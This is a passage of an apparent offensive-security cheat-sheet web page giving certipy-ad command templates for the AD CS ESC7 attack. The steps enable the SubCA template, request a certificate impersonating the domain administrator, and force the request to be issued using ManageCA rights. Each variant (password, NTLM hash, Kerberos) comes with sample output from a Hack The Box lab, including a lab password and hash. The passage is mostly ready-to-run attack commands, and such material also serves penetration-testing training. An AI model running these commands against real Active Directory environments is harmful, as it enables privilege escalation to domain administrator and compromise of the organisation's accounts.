</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -enable-template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -enable-template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -enable-template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully enabled 'SubCA' on 'manager-DC01-CA'
</span></span></span></div></pre></div><h4 id="3-request-a-cert-based-on-subca">3. Request a Cert Based on SubCA</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -target dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 21
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span></span><span class="line"><span class="cl"><span class="go">Would you like to save the private key? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Failed to request certificate
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -target dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 21
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span></span><span class="line"><span class="cl"><span class="go">Would you like to save the private key? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Failed to request certificate
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven@manager.htb'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 21
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span></span><span class="line"><span class="cl"><span class="go">Would you like to save the private key? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Failed to request certificate
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven@manager.htb'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 21
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span></span><span class="line"><span class="cl"><span class="go">Would you like to save the private key? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Failed to request certificate
</span></span></span></div></pre></div><div class="highlight ticket-based-kerberos codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ticket-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -upn <span class="o editable-keyword">&lt;TARGET_USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -template 'SubCA'
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">'raven@manager.htb'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -upn administrator@manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -template <span class="s1">'SubCA'</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 21
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
</span></span></span><span class="line"><span class="cl"><span class="go">Would you like to save the private key? (y/N): y
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Wrote private key to '21.key'
</span></span></span><span class="line"><span class="cl"><span class="go">[-] Failed to request certificate
</span></span></span></div></pre></div><p><small><em>Note: Expect to be failed. Take note of the Request ID</em></small></p>
<h4 id="4-issue-request-using-manageca-and-manage-certificates-privilege">4. Issue Request Using ManageCA and Manage Certificates Privilege</h4>
<div class="highlight password codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -issue-request <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully issued certificate request ID 21
</span></span></span></div></pre></div><div class="highlight ntlm codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -issue-request <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -target dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Successfully issued certificate request ID 21
</span></span></span></div></pre></div><div class="highlight password-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -issue-request <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -p <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully issued certificate request ID 21
</span></span></span></div></pre></div><div class="highlight ntlm-based-kerberos codeBlock"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> NTLM-based Kerberos
</span></span><span class="line"><span class="cl"><span class="go">certipy-ad ca -u '<span class="o editable-keyword">&lt;USER&gt;</span>@<span class="o editable-keyword">&lt;DOMAIN&gt;</span>' -hashes '<span class="o editable-keyword">&lt;HASH&gt;</span>' -k -target <span class="o editable-keyword">&lt;TARGET&gt;</span> -dc-host <span class="o editable-keyword">&lt;DC&gt;</span> -ca <span class="o editable-keyword">&lt;CA&gt;</span> -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> -issue-request <span class="o editable-keyword">&lt;REQUEST_ID&gt;</span>
</span></span></span></code><div class="output-bubble">Sample Output:
<span class="line"><span class="cl"><span class="gp">$</span> certipy-ad ca -u <span class="s1">'raven@manager.htb'</span> -hashes <span class="s1">'1635e153d4d6541a6367ec7a369d1fc7'</span> -k -target dc01.manager.htb -dc-host dc01.manager.htb -ca manager-DC01-CA -dc-ip 10.129.255.35 -issue-request <span class="m">21</span>
</span></span><span class="line"><span class="cl"><span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k)
</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] KRB5CCNAME environment variable not set
</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully issued certificate request ID 21
